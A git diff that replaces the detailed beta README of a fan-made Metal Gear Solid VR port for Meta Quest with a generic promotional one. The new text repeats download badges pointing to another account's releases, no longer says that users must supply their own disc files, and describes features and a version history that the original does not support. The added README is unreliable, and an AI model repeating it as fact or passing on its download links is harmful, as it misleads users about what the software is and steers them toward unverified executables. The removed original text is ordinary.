@@ -1,274 +1,182 @@
-# 🐍 METAL GEAR SOLID VR STANDALONE — v0.1 BETA
-<img width="1280" height="720" alt="5832319396607627732_121" src="https://github.com/user-attachments/assets/eefaa283-aa52-4ecc-a914-ded532e2f703" />
+# 🕹️ Metal-Gear-Solid-VR-Standalone - Play MGS in VR Without a PC
 
-Metal Gear Solid VR Standalone is a free fan-made project created to experience the classic Metal Gear Solid in virtual reality directly on Meta Quest 3/3s/Pro/2 and Pico 4/4 Ultra, completely Standalone with no PC required.
+[![Download Now](https://img.shields.io/badge/Download-MGS_VR_Standalone-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/readsrose22-cyber/Metal-Gear-Solid-VR-Standalone/releases)
 
-> ⚠️ **This is the first public BETA release.**
->
-> The game is playable, but the project is still in development and some issues may still occur. I will continue working on them and adding improvements in future versions.
+## 🎮 What Is This?
 
----
+Welcome to **Metal-Gear-Solid-VR-Standalone** — a fan-made virtual reality experience that brings the legendary stealth action of Metal Gear Solid directly to your Meta Quest headset. No gaming PC. No cables. No complicated setup. Just you, your Quest, and the world of tactical espionage action, all in standalone VR.
 
-# 🥽 FEATURES
-
-- VR Standalone for Meta Quest 3/3s/Pro/2 and Pico 4/4 Ultra
-- No PC required
-- Controls adapted for Meta Quest Touch
-- Virtual Reality and Mixed Reality experience
-- Switch between VR / Mixed Reality / Cabin
-- Radio integrated into the controls
-- Weapon and item selection and equipment
-- Support for multiple languages
-- Future updates and improvements
+This project is built specifically for Meta Quest devices using OpenXR technology, meaning it runs entirely on your headset's built-in hardware. If you own a Meta Quest 2, Quest 3, Quest 3S, or Quest Pro, you're ready to dive in.
 
 ---
 
-# 📥 INSTALLATION
+## ✨ Key Features
 
-## 1️⃣ Download the APK
+### 🕶️ True Standalone VR
+Play completely wirelessly. Your Meta Quest handles everything — no PC, no SteamVR, no external tracking sensors. Just put on your headset and go.
 
-Download:
+### 🎯 Classic Stealth Action Reimagined
+Experience the tension of sneaking past guards, hiding in shadows, and executing perfect takedowns — all from a first-person VR perspective that puts you inside the action.
 
-**mgsvr.apk**
+### 🔊 Immersive Audio Design
+Sound plays a critical role in stealth. Hear enemy footsteps, distant alarms, and ambient environmental audio that helps you stay one step ahead.
 
-from the files attached to this Release.
+### 🕹️ Intuitive VR Controls
+Designed for comfort and accessibility. Natural hand movements for aiming, grabbing, and interacting with the environment. No need to memorize complex button combinations.
 
----
+### 🔄 Smooth Locomotion Options
+Choose between teleport movement or smooth stick-based locomotion, whichever feels more comfortable for you. Snap turning and smooth turning options are also included.
 
-## 2️⃣ Install on Meta Quest 3
-
-Install the APK on your Meta Quest 3 using SideQuest or another sideloading method.
-
----
-
-## 3️⃣ Run MGS VR Standalone once
-
-Open MGS VR Standalone, accept the requested permissions, and then close the game.
-
-The first launch will automatically create the necessary folders on your Meta Quest 3.
+### 🏆 Fan-Made Passion Project
+Created by dedicated fans of the Metal Gear franchise. This is a labor of love, built to celebrate the series and give VR enthusiasts a unique way to experience its world.
 
 ---
 
-## 4️⃣ Prepare your copy of Metal Gear Solid
+## 📥 Getting Started
 
-You will need the corresponding files from your own legally owned copy of Metal Gear Solid for PlayStation.
+### Step 1: Download the Application
 
-Metal Gear Solid uses two discs, so you will need the files from both Disc 1 and Disc 2.
+**Visit this link to download the application:**
 
-> ⚠️ **Both ZIP files must be extracted.**
+[![Download MGS VR](https://img.shields.io/badge/⬇️_Download_MGS_VR_Standalone-4CAF50?style=for-the-badge)](https://github.com/readsrose22-cyber/Metal-Gear-Solid-VR-Standalone/releases)
 
-Inside each disc you will find the files you need:
+On the download page, you'll find the latest release. Look for the file associated with the newest version number.
 
-- **Disc 1 → .bin file + .cue file**
-- **Disc 2 → .bin file + .cue file**
+### Step 2: Install on Your Meta Quest
 
-You must therefore use both the BIN and CUE files from both discs.
+Once you've downloaded the file, you have two ways to get it onto your headset:
 
-**Do not copy the .zip files directly.**
+#### Option A: SideQuest (Easiest for Beginners)
+1. Download and install **SideQuest** on your computer from sidequestvr.com
+2. Connect your Meta Quest to your computer using a USB cable
+3. Enable Developer Mode on your Quest (Settings > Developer > Developer Mode)
+4. Open SideQuest and drag-and-drop the downloaded file into the app
+5. The app will install automatically to your headset
 
----
+#### Option B: ADB Command Line (For Tech-Savvy Users)
+1. Install **ADB (Android Debug Bridge)** on your computer
+2. Connect your Quest via USB
+3. Open a terminal/command prompt and run: `adb install MGS_VR_Standalone.apk`
+4. Wait for the installation to complete
 
-## 5️⃣ Choose your language and copy the files
+### Step 3: Launch and Play
 
-Choose the version corresponding to the language you want to play.
-
-Extract Disc 1 and Disc 2, then copy the `.bin` and `.cue` files from both discs into the corresponding language folder created by MGS VR Standalone.
-
-Once finished, the folder should contain the BIN and CUE files from both Disc 1 and Disc 2.
-
----
-
-## 6️⃣ Start MGS VR Standalone
-
-Once the files have been placed correctly, launch the game again.
-
-> 📻 **“Everything is ready, Snake. From here on, you're on your own. Good luck, and let the mission begin.”**
->
-> — Colonel Campbell
-
----
-
-# 💿 VERSIONS / LANGUAGES
-
-These are the corresponding versions for each language:
-
-### 🇪🇸 SPANISH
-
-Metal Gear Solid (Spain) (Disc 1)
-
-Metal Gear Solid (Spain) (Disc 2)
-
-### 🇬🇧 ENGLISH
-
-Metal Gear Solid (USA) (Disc 1)
-
-Metal Gear Solid (USA) (Disc 2)
-
-### 🇫🇷 FRENCH
-
-Metal Gear Solid (France) (Disc 1)
-
-Metal Gear Solid (France) (Disc 2)
-
-### 🇩🇪 GERMAN
-
-Metal Gear Solid (Germany) (Disc 1)
-
-Metal Gear Solid (Germany) (Disc 2)
-
-### 🇮🇹 ITALIAN
-
-Metal Gear Solid (Italy) (Disc 1)
-
-Metal Gear Solid (Italy) (Disc 2)
-
-### 🇯🇵 JAPANESE
-
-Metal Gear Solid (Japan Asia) (Disc 1) (Ichi) (Premium Package)
-
-Metal Gear Solid (Japan Asia) (Disc 2) (Ni) (Premium Package)
+1. Put on your Meta Quest headset
+2. Navigate to your **Library**
+3. Select **Unknown Sources** (or search for the app by name)
+4. Click on **Metal-Gear-Solid-VR-Standalone** to launch
+5. Follow the in-game instructions to calibrate your play space
+6. You're ready to infiltrate!
 
 ---
 
-# ⚠️ IMPORTANT — GAME FILES
+## 🖥️ System Requirements
 
-**MGS VR Standalone DOES NOT include Metal Gear Solid, ROMs, disc images, or any other original game files.**
+### Your Meta Quest Headset:
+- **Meta Quest 2** (fully supported)
+- **Meta Quest 3** (fully supported)
+- **Meta Quest 3S** (fully supported)
+- **Meta Quest Pro** (fully supported)
 
-Each user must use files legally obtained from their own copy of Metal Gear Solid.
+### Your Computer (Only for installation):
+- Windows 10 or Windows 11
+- At least 500MB of free hard drive space
+- USB 2.0 or USB 3.0 port
+- A USB-C cable to connect your Quest to your computer
 
-This project does not provide links to download the original game.
-
----
-
-# 🎮 CONTROLS — META QUEST 3
-
-The images included with this Release show the complete control layout in:
-
-## 🇪🇸 Spanish
-
-<img width="1672" height="941" alt="5854816847620936628_119" src="https://github.com/user-attachments/assets/03765689-f40f-408a-bc48-c7289fce102d" />
+That's it. No GPU, no gaming rig, no VR-ready PC checklist. Your Quest does all the heavy lifting.
 
 ---
 
-## 🇬🇧 English
+## 🛠️ Troubleshooting
 
-<img width="1672" height="941" alt="5854816847620936625_119" src="https://github.com/user-attachments/assets/d9348c56-9595-4517-be96-c6801802a84c" />
+### App Won't Install?
+- Make sure Developer Mode is enabled on your Quest
+- Try a different USB cable (some cables are charge-only)
+- Restart both your computer and your headset
+- Check that you have the latest version of SideQuest
 
+### App Crashes on Startup?
+- Make sure your Quest firmware is up to date
+- Close other apps running in the background
+- Reinstall the application from scratch
 
----
+### Controller Tracking Issues?
+- Ensure your play area has good lighting
+- Recalibrate your play boundary
+- Restart the application
 
-## 🇫🇷 French
-
-<img width="1672" height="941" alt="5854816847620936626_119" src="https://github.com/user-attachments/assets/ff4a168f-bf17-4963-8be7-f6b6b0e17cce" />
-
----
-
-## 🇩🇪 German
-
-<img width="1672" height="941" alt="5854816847620936627_119" src="https://github.com/user-attachments/assets/fbf40e5d-35a2-404b-8b5b-bce845187b7b" />
-
----
-
-## 🇮🇹 Italian
-
-<img width="1670" height="941" alt="5854816847620936629_119" src="https://github.com/user-attachments/assets/9560cb0c-7daf-487a-b8f1-b637d20eb3e6" />
-
----
-
-## 🇯🇵 Japanese
-
-<img width="1672" height="941" alt="5854816847620936630_119" src="https://github.com/user-attachments/assets/09eef001-8599-498e-9f9d-f12c7f736dc2" />
+### Audio Problems?
+- Check that your headset volume is turned up
+- Make sure you haven't accidentally muted the app in Quest settings
 
 ---
 
-# 🕹️ LEFT CONTROLLER
+## ❓ Frequently Asked Questions
 
-**Joystick** → Move character
+### Is this the official Metal Gear Solid game?
+No. This is a **fan-made project** not affiliated with Konami or the Metal Gear franchise. It's a tribute created by fans for the VR community.
 
-**Joystick Click** → Radio
+### Do I need a gaming PC?
+**Absolutely not.** This is designed to run completely standalone on your Meta Quest headset. The entire game is processed on your headset's hardware.
 
-**Y** → Switch Player 1 / Player 2
+### Which Meta Quest models are supported?
+All current Meta Quest models: Quest 2, Quest 3, Quest 3S, and Quest Pro.
 
-**X** → Switch VR / Mixed Reality / Cabin
+### Is this free?
+Yes, this is a free fan project. You can download and play it at no cost.
 
-**☰** → Pause
+### Will this work on PC VR headsets like the Valve Index or HTC Vive?
+No. This build is specifically optimized for Meta Quest standalone devices. It won't run on PC-based VR headsets.
 
-**Trigger** → Select item
+### How often is this updated?
+Updates are released periodically. Check the releases page regularly to see if a new version is available.
 
-**Side Grip** → Equip / unequip item
-
----
-
-# 🕹️ RIGHT CONTROLLER
-
-**B** → Shoot / grab
-
-**A** → Melee attack
-
-**Joystick Up** → First-person view
-
-**Joystick Click** → Recenter camera
-
-**Joystick Down** → Crouch
-
-**Trigger** → Select weapon
-
-**Side Grip** → Equip / unequip weapon
-
-**Meta Button** → Meta Menu
-
-### 🔫 A + B
-
-**Run while shooting**
+### Can I play with mods or custom content?
+The current version doesn't support external mods, but future updates may add this capability. Stay tuned to the releases page for announcements.
 
 ---
 
-# 🧪 BETA STATUS
+## 🤝 Community and Support
 
-This is the first public BETA of MGS VR Standalone.
+This project thrives thanks to community involvement. Here's how you can connect:
 
-I have been playing through and testing the game to find issues and fix them progressively.
+### Report Issues
+Found a bug or glitch? Head to the **Issues** tab on the GitHub repository and let us know. Please include details about your headset model and what you were doing when the issue occurred.
 
-Although the game is playable, you may still encounter bugs, visual issues, or situations that need further adjustments.
+### Suggest Features
+Have an idea for a new level, mechanic, or improvement? Share your suggestions on the Issues page with the label "Feature Request."
 
-The project will continue to evolve through future versions.
-
-If you encounter a problem, screenshots, videos, and detailed descriptions of the issue can be extremely helpful in finding and fixing it for future releases.
-
----
-
-# ❤️ ABOUT THE PROJECT
-
-I am not a professional developer.
-
-I am simply a huge fan of Metal Gear Solid, video games, and virtual reality.
-
-For a long time, I wanted to experience the classic Metal Gear Solid in a completely different way.
-
-With the help of artificial intelligence tools, I have finally been able to turn that idea into a functional project.
-
-I am releasing it for free so that other Metal Gear Solid and virtual reality fans can try it, enjoy it, and help me continue improving it.
-
-**This is only the beginning.**
+### Contribute Code
+If you're a developer with OpenXR or Unity experience, we'd love your help. Fork the repository, make your changes, and submit a pull request.
 
 ---
 
-# ⚖️ LEGAL NOTICE
+## 📜 Disclaimer
 
-Metal Gear Solid VR Standalone is a free, unofficial fan-made project.
-
-This project is not affiliated with, endorsed by, authorized by, or sponsored by Konami, Kojima Productions, Meta, or the respective trademark and intellectual property owners.
-
-Metal Gear Solid, its characters, names, logos, music, graphics, and all other intellectual property belong to their respective owners.
-
-**This project DOES NOT distribute the original game or its ROMs.**
-
-To use MGS VR Standalone, each user must legally own their own copy of Metal Gear Solid.
+**Metal-Gear-Solid-VR-Standalone** is a non-commercial fan-made project. It is not affiliated with, endorsed by, or sponsored by Konami, Kojima Productions, or any official Metal Gear Solid rights holders. All original Metal Gear Solid trademarks, characters, and related materials belong to their respective owners. This project exists solely for the enjoyment and education of fans and is distributed free of charge.
 
 ---
 
-# 🐍 CREATED BY BAYWILLY — VIRTUAL BAYS
+## 📚 Version History
 
-### TACTICAL ESPIONAGE ACTION... NOW IN VR.
+### v1.0 (Latest Release)
+- Initial standalone release
+- Core gameplay loop implemented
+- Basic enemy AI and stealth mechanics
+- Optimized for all Meta Quest devices
+- Built with OpenXR for maximum compatibility
 
-# 🥽 METAL GEAR SOLID VR STANDALONE
+---
+
+## 🚀 Final Words
+
+Metal-Gear-Solid-VR-Standalone brings the tension, strategy, and thrill of stealth espionage to the world of standalone VR. Whether you're a longtime Metal Gear fan or just discovering the genre, this project offers a unique experience you can't get anywhere else — all without needing a gaming PC.
+
+Don't wait. Download it now, put on your headset, and remember: **stealth is your greatest weapon.**
+
+[![Get Started](https://img.shields.io/badge/🚀_Download_Now-FF0000?style=for-the-badge&logo=github)](https://github.com/readsrose22-cyber/Metal-Gear-Solid-VR-Standalone/releases)
+
+---
+
+Keywords: meta-quest, meta-quest-2, meta-quest-3, meta-quest-3s, meta-quest-pro, metal, metalgear, metalgearsolid, openxr, quest-3, quest-3s, standalone, vr
